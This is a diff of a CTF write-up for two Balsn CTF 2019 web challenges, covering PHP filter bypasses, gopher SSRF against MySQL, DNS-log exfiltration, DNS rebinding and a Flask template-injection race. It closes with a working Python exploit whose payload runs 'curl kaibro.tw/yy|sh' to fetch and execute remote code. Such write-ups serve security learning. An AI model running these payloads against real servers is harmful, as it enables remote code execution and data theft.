@@ -17,9 +17,13 @@ Baby PHP challenge again.
 
 ### Source Code
 
-- [Warmup](https://github.com/w181496/My-CTF-Challenges)
+- [Warmup](https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2019/Warmup/index.php)
 
 ### Solution
+
+This challenge consists of many simple and old PHP/Windows tricks.
+
+<br>
 
 #### Step 1
 
@@ -95,14 +99,18 @@ After refactoring, you will get the clean code like this:
     }
 ```
 
+<br>
+
 #### Step 2
 
 Let's try to read the `config.php`
 
-There are two method:
+There are two methods:
 
 1. use the `file_get_contents()` (Intended)
 2. use the `eval()` (Unintended)
+
+<br>
 
 **Method 0x1**
 
@@ -180,6 +188,8 @@ Now you have the `config.php`:
     // ====================================
 ```
 
+<br>
+
 **Method 0x2**
 
 Many teams use the `eval()` of first branch to read `config.php`. 
@@ -193,7 +203,7 @@ if( preg_match('/[\x00-!\'0-9"`&$.,|^[{_zdxfegavpos\x7F]+/i',$_) || @strlen(coun
     exit($secret);
 ```
 
-But we can use `~` operator to bypass many restriction.
+But we can use `~` operator to bypass many restrictions.
 
 Example: `~urldecode("%8D%9A%9E%9B%99%96%93%9A")` is equal to `readfile`.
 
@@ -215,6 +225,8 @@ Finally, we can combine `~` trick and `<` trick to read the `config.php`:
 
 (It is same as `readfile("co<<")`)
 
+<br>
+
 ### Step 3
 
 The content of `config.php` tells us that the flag is in the MySQL database.
@@ -225,7 +237,7 @@ And we know the user is `admin` with empty password, so we can use `gopher://` p
 
 <br>
 
-But we sholud find a way to bypass the strict regex rule first.
+But the gopher payload is toooooo long, we sholud find a way to bypass the strict regex rule first.
 
 If you try to search all PHP functions that satisfy the regex rule and length limit, you will find a useful function: `getenv()`.
 
@@ -237,13 +249,15 @@ So we can put our gopher payload into the HTTP header.
 
 It is equal to `getenv("HTTP_T")`.
 
+<br>
+
 ### Step 4
 
-Now, you have a blind SSRF.
+Now, you have a blind SSRF!
 
 For the MySQL protocol, you can use some tools like [Gopherus](https://github.com/tarunkant/Gopherus) to create the gopher payload.
 
-And last, you can use Time-based or Out-of-band (DNS log) methods to exfiltration the query result.
+At last, you just need to use Time-based or Out-of-band (DNS log) methods to exfiltration the query result.
 
 - `select load_file(concat("\\\\",table_name,".e222e6f24ba81a9b414f.d.zhack.ca/a")) from information_schema.tables where table_schema="ThisIsTheDbName";`
     - Output: `fl4ggg`
@@ -253,6 +267,7 @@ And last, you can use Time-based or Out-of-band (DNS log) methods to exfiltratio
     - Output: `42616C736E7B337A5F77316E643077735F7068705F6368346C7D`
     - hex to ascii: `Balsn{3z_w1nd0ws_php_ch4l}`
 
+---
 
 ## 卍乂Oo韓國魚oO乂卍 (Koreanfish)
 
@@ -263,6 +278,172 @@ And last, you can use Time-based or Out-of-band (DNS log) methods to exfiltratio
 
 ### Description
 
+Taiwanese people love korean fish.
+
+[Server Link](http://koreanfish.balsnctf.com/)
+
+[Download](https://static.balsnctf.com/koreafish/d68fcc656a04423422ff162d9793606f2c5068904fced9087edc28efc411e7b7/koreafish-src.zip)
+
 ### Source Code
 
+- [Warmup](https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2019/Koreanfish/)
+
 ### Solution
+
+This is a whitebox challenge, and all the source code are very short :D
+
+<br>
+
+#### Step 1
+
+If you look the source code of `index.php`, you will know the first target is to bypass IP limit.
+
+Actually, here is a obvious DNS Rebinding vulnerability that can bypass IP limit:
+
+```
+$ip = @dns_get_record($res['host'], DNS_A)[0]['ip'];
+...
+$dev_ip = "54.87.54.87";
+if($ip === $dev_ip) {
+    $content = file_get_contents($dst);
+```
+
+The `file_get_contents()` will query DNS again.
+
+So if we set our domain's A record to `54.87.54.87` and `127.0.0.1`, it has some possibilities to bypass IP restriction to query internal services.
+
+If you don't have any domain ... 
+
+Don't worry! You can use some online DNS Rebinding services like `rbndr.us`.
+
+e.g. `36573657.7f000001.rbndr.us` will return `54.87.54.87` or `127.0.0.1`.
+
+<br>
+
+#### Step 2
+
+From the dockerfile, we know there is a simple flask app running on the same server.
+
+And there is a SSTI vulnerability on `/error_page` function, it uses `render_template_string()` with controllable content.
+
+<br>
+
+If the `error_status` set to absolute path, then the `os.path.join()` return path will be overwrited.
+
+e.g. `os.path.join("/var/www/flask", "error", "/etc/passwd")` will return `/etc/passwd`
+
+<br>
+
+But the problem here is that you can't directly touch this `/error_page`.
+
+Because the front-end php will check the query path, the path has to contain the string of `korea`.
+
+`if(stripos($res['path'], "korea") === FALSE) die("Error");`
+
+<br>
+
+There are two ways that can bypass this restriction:
+
+<br>
+
+**Method 0x1**
+
+You can use redirect!
+
+Using DNS Rebinding to your Server IP, Then set the path `/korea` to redirect to `127.0.0.1:5000/error_page?err=....`.
+
+Because the `file_get_contents()` will follow the 302 redirect.
+
+<br>
+
+**Method 0x2**
+
+Using Flask's special feature!
+
+In the flask app, `//korea/ping` is equal to `/ping`.
+
+So you can just use `//korea/error_page?err=....` to bypass the restriction.
+
+<br>
+
+#### Step 4
+
+Now, we can control the path of the content that `render_template_string()` read.
+
+But we should find a file that can be placed our controllable payload.
+
+Because the server is running with PHP, so you can use the `session.upload_progress` trick to upload your SSTI payload to the session file.
+
+If you provide the `PHP_SESSION_UPLOAD_PROGRESS` in the multipart POST data, PHP will enable the session for you.
+
+(The concept is same as HITCON CTF 2018 - one line php challenge: [Link](https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html).)
+
+<br>
+
+#### Step 5
+
+The default `session.upload_progress.cleanup` setting is `On`, so your uploaded payload will be cleaned.
+
+Let's Race it!
+
+Exploit script:
+
+```python
+import sys
+import string
+import requests
+from base64 import b64encode
+from random import sample, randint
+from multiprocessing.dummy import Pool as ThreadPool
+
+HOST = 'http://koreanfish4.balsnctf.com/index.php'
+sess_name = 'iamkaibro'
+
+headers = {
+    'Connection': 'close', 
+    'Cookie': 'PHPSESSID=' + sess_name
+}
+
+payload = """
+{% for c in []['__class__']['__base__']['__subclasses__']() %}
+{% if c['__name__'] == 'catch_warnings' %}
+{% for b in c['__init__']['__globals__']['values']() %}
+{% if b['__class__']=={}['__class__'] %}
+{% if 'eval' in b['keys']() %}
+{% if b['eval']('__import__("os")\\x2epopen("curl kaibro\\x2etw/yy\\x7csh")') %}{% endif %}
+{% endif %}
+{% endif %}
+{% endfor %}
+{% endif %}
+{% endfor %}
+"""
+
+def runner1(i):
+    data = {
+        'PHP_SESSION_UPLOAD_PROGRESS': payload
+    }
+    while 1:
+        fp = open('/etc/passwd', 'rb')
+        r = requests.post(HOST, files={'f': fp}, data=data, headers=headers)
+        fp.close()
+
+def runner2(i):
+    filename = '/var/lib/php/sessions/sess_' + sess_name
+    # print filename
+    while 1:
+        url = '{}?%F0%9F%87%B0%F0%9F%87%B7%F0%9F%90%9F=http://36573657.7f000001.rbndr.us:5000//korea/error_page%3Ferr={}'.format(HOST, filename)
+        r = requests.get(url, headers=headers)
+        c = r.content
+        print [c]
+
+if sys.argv[1] == '1':
+    runner = runner1
+else:
+    runner = runner2
+
+pool = ThreadPool(32)
+result = pool.map_async( runner, range(32) ).get(0xffff)
+```
+
+
+
